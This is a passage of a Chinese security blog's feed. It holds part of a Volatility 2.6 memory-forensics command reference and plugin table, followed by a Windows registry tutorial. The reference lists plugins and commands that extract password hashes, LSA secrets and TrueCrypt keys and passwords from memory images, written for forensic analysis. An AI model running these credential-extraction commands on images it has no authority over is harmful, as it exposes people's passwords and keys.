plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 userassist</span><br></pre></td></tr></table></figure><p>26.最大程序提取信息timeliner</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 timeliner</span><br></pre></td></tr></table></figure><p>timeliner: 将所有操作系统事件以时间线的方式展开</p><p>27.查看剪贴板信息clipboard</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 clipboard</span><br></pre></td></tr></table></figure><p>clipboard：查看剪贴板信息</p><p><strong>28.显示关于计算机及其操作系统的详细配置信息（插件）systeminfo</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 systeminfo</span><br></pre></td></tr></table></figure><p>systeminfo：显示关于计算机及其操作系统的详细配置信息（插件）</p><p>29.恢复被删除的文件mftparser</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 mftparser</span><br></pre></td></tr></table></figure><p>mftparser：恢复被删除的文件</p><p>30.查看环境变量envars</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 envars</span><br></pre></td></tr></table></figure><p>envars：查看环境变量</p><p>31.列出某一进程加载的所有dll文件dlllist</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 dlllist -p 2588</span><br></pre></td></tr></table></figure><p>dlllist: 列出某一进程加载的所有dll文件</p><p>需要指定进程-p [pid]</p><p>32.程序版本信息 verinfo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 verinfo</span><br></pre></td></tr></table></figure><p>列出PE｜程序版本信息</p><p><strong>33.产看进程树，可以轻松了解各进程之间的关系：父进程与子进程 pstree</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 2008.raw –profile=Win2008R2SP1x64 pstree</span><br></pre></td></tr></table></figure><p>在进程中PPID比PID还大，那就可能这个进程有异常程序</p><p>34.从内存文件中找到异常程序植入到系统的开机自启痕迹 shimcache</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 2008.raw –profile=Win2008R2SP1x64 shimcache</span><br></pre></td></tr></table></figure><p>35.提取注册表数据dumpregistry</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 2008.raw –profile=Win2008R2SP1x64 dumpregistry</span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>插件名称</strong></th><th><strong>功能</strong></th></tr></thead><tbody><tr><td>amcache</td><td>查看AmCache应用程序痕迹信息</td></tr><tr><td>apihooks</td><td>检测内核及进程的内存空间中的API hook</td></tr><tr><td>atoms</td><td>列出会话及窗口站atom表</td></tr><tr><td>atomscan</td><td>Atom表的池扫描(Pool scanner)</td></tr><tr><td>auditpol</td><td>列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息</td></tr><tr><td>bigpools</td><td>使用BigPagePoolScanner转储大分页池(big page pools)</td></tr><tr><td>bioskbd</td><td>从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)</td></tr><tr><td>cachedump</td><td>获取内存中缓存的域帐号的密码哈希</td></tr><tr><td>callbacks</td><td>打印全系统通知例程</td></tr><tr><td>clipboard</td><td>提取Windows剪贴板中的内容</td></tr><tr><td>cmdline</td><td>显示进程命令行参数</td></tr><tr><td>cmdscan</td><td>提取执行的命令行历史记录（扫描_COMMAND_HISTORY信息）</td></tr><tr><td>connections</td><td>打印系统打开的网络连接(仅支持Windows XP 和2003)</td></tr><tr><td>connscan</td><td>打印TCP连接信息</td></tr><tr><td>consoles</td><td>提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION信息）</td></tr><tr><td>crashinfo</td><td>提取崩溃转储信息</td></tr><tr><td>deskscan</td><td>tagDESKTOP池扫描(Poolscaner)</td></tr><tr><td>devicetree</td><td>显示设备树信息</td></tr><tr><td>dlldump</td><td>从进程地址空间转储动态链接库</td></tr><tr><td>dlllist</td><td>打印每个进程加载的动态链接库列表</td></tr><tr><td>driverirp</td><td>IRP hook驱动检测</td></tr><tr><td>drivermodule</td><td>关联驱动对象至内核模块</td></tr><tr><td>driverscan</td><td>驱动对象池扫描</td></tr><tr><td>dumpcerts</td><td>提取RAS私钥及SSL公钥</td></tr><tr><td>dumpfiles</td><td>提取内存中映射或缓存的文件</td></tr><tr><td>dumpregistry</td><td>转储内存中注册表信息至磁盘</td></tr><tr><td>editbox</td><td>查看Edit编辑控件信息 (Listbox正在实验中)</td></tr><tr><td>envars</td><td>显示进程的环境变量</td></tr><tr><td>eventhooks</td><td>打印Windows事件hook详细信息</td></tr><tr><td>evtlogs</td><td>提取Windows事件日志（仅支持XP&#x2F;2003)</td></tr><tr><td>filescan</td><td>提取文件对象（file objects）池信息</td></tr><tr><td>gahti</td><td>转储用户句柄（handle）类型信息</td></tr><tr><td>gditimers</td><td>打印已安装的GDI计时器(timers)及回调(callbacks)</td></tr><tr><td>gdt</td><td>显示全局描述符表(Global Deor Table)</td></tr><tr><td>getservicesids</td><td>获取注册表中的服务名称并返回SID信息</td></tr><tr><td>getsids</td><td>打印每个进程的SID信息</td></tr><tr><td>handles</td><td>打印每个进程打开的句柄的列表</td></tr><tr><td>hashdump</td><td>转储内存中的Windows帐户密码哈希(LM&#x2F;NTLM)</td></tr><tr><td>hibinfo</td><td>转储休眠文件信息</td></tr><tr><td>hivedump</td><td>打印注册表配置单元信息</td></tr><tr><td>hivelist</td><td>打印注册表配置单元列表</td></tr><tr><td>hivescan</td><td>注册表配置单元池扫描</td></tr><tr><td>hpakextract</td><td>从HPAK文件（Fast Dump格式）提取物理内存数据</td></tr><tr><td>hpakinfo</td><td>查看HPAK文件属性及相关信息</td></tr><tr><td>idt</td><td>显示中断描述符表(Interrupt Deor Table)</td></tr><tr><td>iehistory</td><td>重建IE缓存及访问历史记录</td></tr><tr><td>imagecopy</td><td>将物理地址空间导出原生DD镜像文件</td></tr><tr><td>imageinfo</td><td>查看&#x2F;识别镜像信息</td></tr><tr><td>impscan</td><td>扫描对导入函数的调用</td></tr><tr><td>joblinks</td><td>打印进程任务链接信息</td></tr><tr><td>kdbgscan</td><td>搜索和转储潜在KDBG值</td></tr><tr><td>kpcrscan</td><td>搜索和转储潜在KPCR值</td></tr><tr><td>ldrmodules</td><td>检测未链接的动态链接DLL</td></tr><tr><td>lsadump</td><td>从注册表中提取LSA密钥信息（已解密）</td></tr><tr><td>machoinfo</td><td>转储Mach-O 文件格式信息</td></tr><tr><td>malfind</td><td>查找隐藏的和插入的代码</td></tr><tr><td>mbrparser</td><td>扫描并解析潜在的主引导记录(MBR)</td></tr><tr><td>memdump</td><td>转储进程的可寻址内存</td></tr><tr><td>memmap</td><td>打印内存映射</td></tr><tr><td>messagehooks</td><td>桌面和窗口消息钩子的线程列表</td></tr><tr><td>mftparser</td><td>扫描并解析潜在的MFT条目</td></tr><tr><td>moddump</td><td>转储内核驱动程序到可执行文件的示例</td></tr><tr><td>modscan</td><td>内核模块池扫描</td></tr><tr><td>modules</td><td>打印加载模块的列表</td></tr><tr><td>multiscan</td><td>批量扫描各种对象</td></tr><tr><td>mutantscan</td><td>对互斥对象池扫描</td></tr><tr><td>notepad</td><td>查看记事本当前显示的文本</td></tr><tr><td>objtypescan</td><td>扫描窗口对象类型对象</td></tr><tr><td>patcher</td><td>基于页面扫描的补丁程序内存</td></tr><tr><td>poolpeek</td><td>可配置的池扫描器插件</td></tr><tr><td>printkey</td><td>打印注册表项及其子项和值</td></tr><tr><td>privs</td><td>显示进程权限</td></tr><tr><td>procdump</td><td>进程转储到一个可执行文件示例</td></tr><tr><td>pslist</td><td>按照EPROCESS列表打印所有正在运行的进程</td></tr><tr><td>psscan</td><td>进程对象池扫描</td></tr><tr><td>pstree</td><td>以树型方式打印进程列表</td></tr><tr><td>psxview</td><td>查找带有隐藏进程的所有进程列表</td></tr><tr><td>qemuinfo</td><td>转储Qemu 信息</td></tr><tr><td>raw2dmp</td><td>将物理内存原生数据转换为windbg崩溃转储格式</td></tr><tr><td>screenshot</td><td>基于GDI Windows的虚拟屏幕截图保存</td></tr><tr><td>servicediff</td><td>Windows服务列表(ala Plugx)</td></tr><tr><td>sessions</td><td>_MM_SESSION_SPACE的详细信息列表(用户登录会话)</td></tr><tr><td>shellbags</td><td>打印Shellbags信息</td></tr><tr><td>shimcache</td><td>解析应用程序兼容性Shim缓存注册表项</td></tr><tr><td>shutdowntime</td><td>从内存中的注册表信息获取机器关机时间</td></tr><tr><td>sockets</td><td>打印已打开套接字列表</td></tr><tr><td>sockscan</td><td>TCP套接字对象池扫描</td></tr><tr><td>ssdt</td><td>显示SSDT条目</td></tr><tr><td>strings</td><td>物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)</td></tr><tr><td>svcscan</td><td>Windows服务列表扫描</td></tr><tr><td>symlinkscan</td><td>符号链接对象池扫描</td></tr><tr><td>thrdscan</td><td>线程对象池扫描</td></tr><tr><td>threads</td><td>调查_ETHREAD 和_KTHREADs</td></tr><tr><td>timeliner</td><td>创建内存中的各种痕迹信息的时间线</td></tr><tr><td>timers</td><td>打印内核计时器及关联模块的DPC</td></tr><tr><td>truecryptmaster</td><td>恢复TrueCrypt 7.1a主密钥</td></tr><tr><td>truecryptpassphrase</td><td>查找并提取TrueCrypt密码</td></tr><tr><td>truecryptsummary</td><td>TrueCrypt摘要信息</td></tr><tr><td>unloadedmodules</td><td>打印卸载的模块信息列表</td></tr><tr><td>userassist</td><td>打印注册表中UserAssist相关信息</td></tr><tr><td>userhandles</td><td>转储用户句柄表</td></tr><tr><td>vaddump</td><td>转储VAD数据为文件</td></tr><tr><td>vadinfo</td><td>转储VAD信息</td></tr><tr><td>vadtree</td><td>以树形方式显示VAD树信息</td></tr><tr><td>vadwalk</td><td>显示遍历VAD树</td></tr><tr><td>vboxinfo</td><td>转储Virtualbox信息（虚拟机）</td></tr><tr><td>verinfo</td><td>打印PE镜像中的版本信息</td></tr><tr><td>vmwareinfo</td><td>转储VMware VMSS&#x2F;VMSN 信息</td></tr><tr><td>volshell</td><td>内存镜像中的shell</td></tr><tr><td>windows</td><td>打印桌面窗口(详细信息)</td></tr><tr><td>wintree</td><td>Z顺序打印桌面窗口树</td></tr><tr><td>wndscan</td><td>池扫描窗口站</td></tr><tr><td>yarascan</td><td>以Yara签名扫描进程或内核内存</td></tr></tbody></table><h3 id><a href="#" class="headerlink" title></a></h3><table><thead><tr><th><strong>功能</strong></th><th><strong>命令行及参数</strong></th></tr></thead><tbody><tr><td>查看进程列表</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 pslist</td></tr><tr><td>查看进程列表（树形）</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 pstree</td></tr><tr><td>查看进程列表(psx视图)</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 psxview</td></tr><tr><td>查看网络通讯连接</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 netscan</td></tr><tr><td>查看加载的动态链接库</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 dlllist</td></tr><tr><td>查看SSDT表</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 ssdt</td></tr><tr><td>查看UserAssist痕迹</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 userassist</td></tr><tr><td>查看ShimCache痕迹</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 shimcache</td></tr><tr><td>查看ShellBags</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 shellbags</td></tr><tr><td>查看服务列表</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 svcscan</td></tr><tr><td>查看Windows帐户hash</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 hashdump</td></tr><tr><td>查看最后关机时间</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 shutdowntime</td></tr><tr><td>查看IE历史记录</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 iehistory</td></tr><tr><td>提取注册表数据</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 dumpregistry</td></tr><tr><td>解析MFT记录</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 mftparser</td></tr><tr><td>导出MFT记录,恢复文件</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 mftparser –output-file&#x3D;mftverbose.txt -D mftoutput</td></tr><tr><td>获取TrueCrypt密钥信息</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 truecryptmaster</td></tr><tr><td>获取TrueCrypt密码信息</td><td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 truecryptpassphras</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Volatility2-6的使用方法&quot;&gt;&lt;a href=&quot;#Volatility2-6的使用方法&quot; class=&quot;headerlink&quot; title=&quot;Volatility2.6的使用方法&quot;&gt;&lt;/a&gt;Volatility2.6的使用方法&lt;/h1&gt;&lt;p&gt;原文链接：&lt;</summary>
      
    
    
    
    <category term="工具使用详解" scheme="https://w-sqrt7.github.io/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/"/>
    
    
    <category term="转载" scheme="https://w-sqrt7.github.io/tags/%E8%BD%AC%E8%BD%BD/"/>
    
    <category term="工具" scheme="https://w-sqrt7.github.io/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>滴水逆向—C语言笔记</title>
    <link href="https://w-sqrt7.github.io/2024/03/18/dishui-note/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91%E2%80%94C%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/"/>
    <id>https://w-sqrt7.github.io/2024/03/18/dishui-note/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91%E2%80%94C%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/</id>
    <published>2024-03-18T07:07:46.041Z</published>
    <updated>2024-03-18T07:07:31.082Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="2a15ba59c4896afc5fa4ddbe32a240d5219ebe4179445230efa2eb28419be4cb">e05d9ee6e48268b2b742c6d6f1681d6164fa5aa1dc52a0c978370e90ed17c302a63a466df9fb22fcb8ce418c71d391ef7045c9a0362206f2cec6024735d3437bddffa4cd87005b935983f7fc71381175608b9e2e92623ea511ca2c0267e1b7e53d8f7241da9b1f3a7cf840fbf0cf1e2fd74440faf85e9f652188ffaee1fef998428181ca374288c30a02dcb276a717806121e68d2f03adea7e4664eaaefd0577ff0780518d39e0e33ef7cf272493dac76470d90ff969cf8eb440fc6a01e4b71a3f40c5dd3d70bacd39e396c0d3127ee1</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    <category term="笔记" scheme="https://w-sqrt7.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="滴水逆向" scheme="https://w-sqrt7.github.io/categories/%E7%AC%94%E8%AE%B0/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="逆向" scheme="https://w-sqrt7.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="C语言" scheme="https://w-sqrt7.github.io/tags/C%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>Windows注册表内容详解</title>
    <link href="https://w-sqrt7.github.io/2024/03/18/other/basic/Windows%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%86%85%E5%AE%B9%E8%AF%A6%E8%A7%A3/"/>
    <id>https://w-sqrt7.github.io/2024/03/18/other/basic/Windows%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%86%85%E5%AE%B9%E8%AF%A6%E8%A7%A3/</id>
    <published>2024-03-18T03:28:52.896Z</published>
    <updated>2024-03-18T03:29:51.366Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows注册表内容详解"><a href="#Windows注册表内容详解" class="headerlink" title="Windows注册表内容详解"></a>Windows注册表内容详解</h1><p><strong>原文链接：<a href="http://blog.sina.com.cn/s/blog_4d41e2690100q33v.html">http://blog.sina.com.cn/s/blog_4d41e2690100q33v.html</a></strong></p><p>有效链接：<a href="https://www.cnblogs.com/sepmaple/articles/9401215.html">https://www.cnblogs.com/sepmaple/articles/9401215.html</a></p><h2 id="第一课-注册表基础"><a href="#第一课-注册表基础" class="headerlink" title="第一课  注册表基础"></a>第一课  注册表基础</h2><h3 id="一、什么是注册表"><a href="#一、什么是注册表" class="headerlink" title="一、什么是注册表"></a>一、什么是注册表</h3><p>​注册表是windows操作系统、硬件设备以及客户应用程序得以正常运行和保存设置的核心“数据库”，也可以说是一个非常巨大的树状分层结构的数据库系统。<br>​    注册表记录了用户安装在计算机上的软件和每个程序的相互关联信息，它包括了计算机的硬件配置，包括自动配置的即插即用的设备和已有的各种设备说明、状态属性以及各种状态信息和数据。利用一个功能强大的注册表数据库来统一集中地管理系统硬件设施、软件配置等信息，从而方便了管理，增强了系统的稳定性。</p><h3 id="二、注册表的功能"><a href="#二、注册表的功能" class="headerlink" title="二、注册表的功能"></a>二、注册表的功能</h3><p>​刚才我们看到了，注册表中记录了用户安装在计算机上的软件和每个程序的相关信息，通过它可以控制硬件、软件、用户环境和操作系统界面的数据信息文件。<br>​相关知识：注册表文件的数据信息保存在system.dat和user.dat中、利用regedit.exe程序能够存取注册表文件（其实大家可能也知道regedt32.exe，这两个程序是一样的）</p><h3 id="三、编辑器说明："><a href="#三、编辑器说明：" class="headerlink" title="三、编辑器说明："></a>三、编辑器说明：</h3><p>在运行里键入<strong>regedit</strong>就可以进入了</p><p>根键：这个称为HKEY…………，某一项的句柄项：附加的文件夹和一个或多个值<br>子项：在某一个项（父项）下面出现的项（子项）<br>值项：带有一个名称和一个值的有序值，每个项都可包括任何数量的值项，值项由三个部分组成：名称、数据类型和数据。</p><p>1、名称：不包括反斜线的字符、数字、代表符和空格的任意组合。同一键中不可有相同的名称<br>2、数据类型：包括字符串、二进制和双字节等<br>3、数据：值项的具体值，它的大小可以占用64KB</p><h2 id="第二课-总体结构分析"><a href="#第二课-总体结构分析" class="headerlink" title="第二课  总体结构分析"></a>第二课  总体结构分析</h2><h3 id="注册表包括以下5个根键"><a href="#注册表包括以下5个根键" class="headerlink" title="注册表包括以下5个根键"></a>注册表包括以下5个根键</h3><p><strong>1.HKEY_CLASSES_ROOT</strong><br>说明：该根键包括启动应用程序所需的全部信息，包括扩展名，应用程序与文档之间的关系，驱动程序名，DDE和OLE信息，类ID编号和应用程序与文档的图标等。</p><p><strong>2.HKEY_CURRENT_USER</strong><br>说明：该根键包括当前登录用户的配置信息，包括环境变量，个人程序以及桌面设置等</p><p><strong>3.HKEY_LOCAL_MACHINE</strong><br>说明：该根键包括本地计算机的系统信息，包括硬件和操作系统信息，安全数据和计算机专用的各类软件设置信息</p><p><strong>4.HKEY_USERS</strong><br>说明：该根键包括计算机的所有用户使用的配置数据，这些数据只有在用户登录系统时才能访问。这些信息告诉系统当前用户使用的图标，激活的程序组，开始菜单的内容以及颜色，字体</p><p><strong>5.HKEY_CURRENT_CONFIG</strong><br>说明：该根键包括当前硬件的配置信息，其中的信息是从HKEY_LOCAL_MACHINE中映射出来的。</p><h2 id="第三课-HKEY-CLASSES-ROOT"><a href="#第三课-HKEY-CLASSES-ROOT" class="headerlink" title="第三课 HKEY_CLASSES_ROOT"></a>第三课 HKEY_CLASSES_ROOT</h2><p>​我们知道，在这一个根键中记录的是WINDOWS操作系统中所有数据文件的信息内容，主要记录了不同文件的文件扩展名和与之相对应的应用程序。这就是为什么我们双击某一个文档的时候，可以由系统自动调出应用程序的所在了。<br>​这个根键的子键当大家展开时发现是非常多的，它主要分为两种：一是已经注册的各类文件的扩展名；一是各种文件类型的有关信息。</p><p>下面我们以AVIFILE举例说明一下其下面的子项的含义：</p><p>1、CLSID：分类标识，系统可以用这个类标识来识别相同类型的文件</p><p>2、Compressors：它下面有两个子项：</p><p>​auds:用于设置音频数据压缩程序的类标识；</p><p>​vids:用于设置视频数据压缩程序的类标识</p><p>3、defaultlcon：用于设置默认图标，这个大家可以改一下试试</p><p>4、RIFFHandlers：在它的下面有两个类标识：</p><p>​AVI：用于设置AVI文件的类标识；</p><p>​WAVE：用于设置WAVE文件的类标识</p><p>5、protocol：包括了执行程序和编辑程序的路径和文件名：</p><p>​StdExecute（stdfileediting)server：用于指定编辑程序；</p><p>​StdExecute（stdfileediting)PackageObjects:用于指定后打开AVI包对象的编辑程序；</p><p>​StdExecute（stdfileediting)_verb：用于设置编辑程序时的工作状态，其中有0、1、2等状态</p><p>6、Shell子项：用于设置视频文件的外壳：</p><p>​open:用于设置打开AVI文件的程序；</p><p>​play：用于设置播放命令的程序</p><p>7、Shellex：包括了视频文件的外壳扩展</p><h2 id="第四课-HKEY-CURRENT-USER"><a href="#第四课-HKEY-CURRENT-USER" class="headerlink" title="第四课 HKEY_CURRENT_USER"></a>第四课 HKEY_CURRENT_USER</h2><p>​此根键中保存的信息（当前用户的子项信息）与HKEY_USERS_DEFAULT下面的一模一样的。</p><p>任何对 HKEY_CURRENT_USER根键中的信息的修改都会导致对HKEY_USERS_DEFAULT中子项的修改。</p><h2 id="第五课-HKEY-LOCAL-MACHINE"><a href="#第五课-HKEY-LOCAL-MACHINE" class="headerlink" title="第五课 HKEY_LOCAL_MACHINE"></a>第五课 HKEY_LOCAL_MACHINE</h2><p>​此根键中存放的是用来控制系统和软件的设置，由于这些设置是针对那些使用Windows系统的用户而设置</p><p>的，是一个公共配置信息，所以它与具体的用户没多大关系。</p><p>1、HARDWARE子项：该子项包括了系统使用的浮点处理器、串口等信息：</p><p>​ACPI:存放高级电源管理接口数据；</p><p>​DEVICEMAP：用于存放设备映射；</p><p>​DEscriptION：存放有关系统信息；</p><p>​RESOURCEMAP：用于存放资源列表</p><p>2、SAM子项：这部分被保护了，看不到，可以更改权限后再进行查看，应该是存放计算机上存在的所有用户的名</p><p>称(包括隐藏用户)，<del>（如果没记错的话）</del></p><p>3、SECURITY子项：该子项只是为将来的高级功能而预留的</p><p>4、SOFTWARE子项：该子项中保留的是所有已安装的32位应用程序的信息，各个程序的控制信息分别安装在相应</p><p>的子项中，由于不同的计算机安装的应用程序互不相同，因此这个子项下面的子项信息也不完全一样。</p><p>5、SYSTEM子项：该子项是启动时所需的信息和修复系统时所需要的信息：</p><p>​currentcontrol:保存了当前驱动程序控制集中的所有信息</p><h2 id="第六课-HKEY-USERS"><a href="#第六课-HKEY-USERS" class="headerlink" title="第六课 HKEY_USERS"></a>第六课 HKEY_USERS</h2><p>​此根键中保存的是默认用户（default)，当前登录用户和软件（software) 的信息，其中DEFAULT子项是其中最重要的，它的配置是针对未来将会被创建的新用户的。新用户根据默认用户的配置信息来生成自己的配置文件，该配置文件包括环境、屏幕和声音等多种信息，其中常用的3项有：</p><p>1、AppEvents子项：它包括了各种应用事件的列表：</p><p>​EventLabels:按字母顺序列表；</p><p>​Schemes:按事件分类列表</p><p>2、Control Panel子项：它包括内容与桌面、光标、键盘和鼠标等设置有关</p><p>3、Keyboard layout子项：用于键盘的布局（如语言的加载顺序等）<br>            Preload:语言的加载顺序<br>            Substitutes:设置可替换的键盘语言布局<br>            Toggle:用于选择键盘语言</p><h2 id="第七课-HKEY-CURRENT-CONFIG"><a href="#第七课-HKEY-CURRENT-CONFIG" class="headerlink" title="第七课 HKEY_CURRENT_CONFIG"></a>第七课 HKEY_CURRENT_CONFIG</h2><p>​此根键存放的是当前配置的文件信息。<br>实际上细心的读者已经发现了，五大根键实际上并不是五个，现在把这个做了总结</p><p>​我们都知道用regedit或regedit32都可以打开注册表文件，在XP系统下的时候，这两种方法其实都是一样的，当我们打开注册表后看到了类似资源管理器的东西，这里面都有什么呢？<br>​HKEY_CLASSES_ROOT<br>​HKEY_CURRENT_USER<br>​HKEY_LOCAL_MACHINE<br>​HKEY_USERS<br>​HKEY_CURRENT_CONFIG<br>​看是五个分支，<strong>其实就是HKEY_LOCAL_MACHINE、HKEY_USERS这两个才是真正的注册表键</strong>，其它都是从某</p><p>个分支映射出来的，相当于快捷方式或是别名，这样的话看注册表就简单了许多了，现在说一下每个分支的作用：</p><p>​HKEY_CLASSES_ROOT：列出当前计算机注册的所有COM服务器和与应用程序相关联的所有文件扩展名。<br>​HKEY_CURRENT_USER：保存着当前登录到由这个注册服务的计算机上的用户配置文件。<br>​HKEY_LOCAL_MACHINE：保存操作系统及硬件相关信息的配置单元，它是一个公共的配置信息与具体用户无关，其中关键是两个键值<br>​SOFTWARE：保存着与这台电脑中安装的应用程序相关的设置。<br>​SYSTEM：WINDOWS所装载的设备驱动程序以及当WINDOWS启动时所需要的各种参数。<br>​HKEY_USERS：包含当前计算机所有用户配置文件。<br>​HKEY_CURRENT_CONFIG： 计算机当前会话中的所有硬件配置信息。</p><h2 id="第八课-注册表的基本操作"><a href="#第八课-注册表的基本操作" class="headerlink" title="第八课  注册表的基本操作"></a>第八课  注册表的基本操作</h2><p>1、创建项和项值</p><p>2、更值项的数据</p><p>3、删除项、子项或值项</p><p>4、查找项、值项或数据</p><h3 id="注册表中常用的数据类型有5种："><a href="#注册表中常用的数据类型有5种：" class="headerlink" title="注册表中常用的数据类型有5种："></a>注册表中常用的数据类型有5种：</h3><p>​二进制值（reg_binary）:多数硬件信息以二进制数据存储，而以十六进制格式显示在注册表编辑器中</p><p>​字符串值（reg_sz）:包括字符串的注册表键，使用字符串数据类型</p><p>​双字节值（reg_dword）:是32位信息常显示成4个字节。它在出错控制功能上用处极大，其数据一般以十六进</p><p>制格式显示在注册表编辑器中。<br>        多字符串值(reg_multi_sz):允许将一系列项目作为单独的一个值使用。对于多种网络协议、多个项目、设备列</p><p>表以及其他类似的列表项目来说，可以使用多字符串值可扩充字符串值（reg_expand_sz）：代表一个可扩展的字</p><p>符串</p><h2 id="第九课-注册表破坏的现象及原因"><a href="#第九课-注册表破坏的现象及原因" class="headerlink" title="第九课  注册表破坏的现象及原因"></a>第九课  注册表破坏的现象及原因</h2><h3 id="一、注册表破坏后的常见现象"><a href="#一、注册表破坏后的常见现象" class="headerlink" title="一、注册表破坏后的常见现象"></a>一、注册表破坏后的常见现象</h3><p>​1、无法启动系统<br>​2、无法运行或正常运行合法的应用程序<br>​3、找不到启动系统或运行应用程序所需的文件<br>​4、没有访问应用程序的权限<br>​5、不能正确安装或装入驱动程序<br>​6、不能进行网络连接<br>​7、注册表条目有错误</p><h3 id="二、注册表被破坏的原因"><a href="#二、注册表被破坏的原因" class="headerlink" title="二、注册表被破坏的原因"></a>二、注册表被破坏的原因</h3><p>​1、应用程序错误：这个出现的时候比较多，因为我们知道应用程序或多或少的时候都有错误，都有可能导致</p><p>不同的后果；另外在系统中安装过多的软件后，有可能出现彼此之间的冲突。</p><p>​2、驱动程序不兼容：其实我发现好多出在系统自动安装的驱动程序上，如果你本身有驱动程序盘的话，还是</p><p>用专业的比较好一些</p><p>​3、硬件问题：这里面好我问题出现在硬件质量上，比如硬盘或内存质量不过关造成读写错误，或超频或CMOS或病毒等</p><p>​4、误操作：这个大家不知出现了没有，您的误操作可能会导致注册表出现错误，有的时候甚至会很严重的。</p><h2 id="第十课-备份注册表"><a href="#第十课-备份注册表" class="headerlink" title="第十课  备份注册表"></a>第十课  备份注册表</h2><h3 id="一、手工备份注册表"><a href="#一、手工备份注册表" class="headerlink" title="一、手工备份注册表"></a>一、手工备份注册表</h3><p>大家把以下几个文件直接复制到另一个文件夹就可以了<br>        1、在windows\system32\config下有以下几个文件用以保存系统配置：SAM,SYSTEM,SOFYWARE,DEFAULT<br>        2、在Documetents and settings\username文件夹中保存用户配置文件：NETUSER.DAT,当然对应的LOG文件应该一块保存</p><h3 